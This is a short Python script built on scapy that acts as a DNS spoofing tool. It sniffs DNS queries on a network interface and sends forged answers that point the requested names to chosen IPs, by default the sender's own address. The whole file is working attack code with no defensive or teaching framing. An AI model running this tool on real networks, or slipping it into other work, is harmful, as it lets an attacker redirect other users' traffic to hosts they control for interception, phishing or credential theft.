
from scapy.all import *
from scapy.layers.dns import DNSQR

hosts_dict = {}

def poison(iface=None, hosts=None, expression=None):
	global hosts_dict
	if hosts:
		for line in hosts:
			rule = line.split(' ')
			name = rule[1]
			ip = rule[0]
			hosts_dict[name.encode()] = ip
	else:
		ip = get_if_addr(conf.iface) if not iface else get_if_addr(iface)
		hosts_dict["*"] = ip
	parse_interface(iface, expression)

def parse_interface(iface, expression):
    print("Spoofing DNS packets from interface...")
    if iface:
        sniff(filter=expression, prn=identify_pkt, iface=iface)
    else:
        sniff(filter=expression, prn=identify_pkt)

def identify_pkt(packet):
	if packet.haslayer(UDP) and packet.haslayer(DNSQR):
		process_query(packet)

def spoof_reply(packet, spoof_ip):
	return IP(dst=packet[IP].src, src=packet[IP].dst)/\
	UDP(dport=packet[UDP].sport,sport=packet[UDP].dport)/\
	DNS(id=packet[DNS].id, qd=packet[DNS].qd, qr=1, ancount=1,\
	an=DNSRR(rrname=packet[DNSQR].qname, rdata=spoof_ip))

def process_query(packet):
	#check if its in the hosts_dns
	if packet[DNSQR].qname in hosts_dict:
		#REPLY
		ip_addr = hosts_dict[packet[DNSQR].qname]
	elif "*" in hosts_dict:
		ip_addr = hosts_dict["*"]
	else:
		return
	send(spoof_reply(packet, ip_addr), verbose=0)




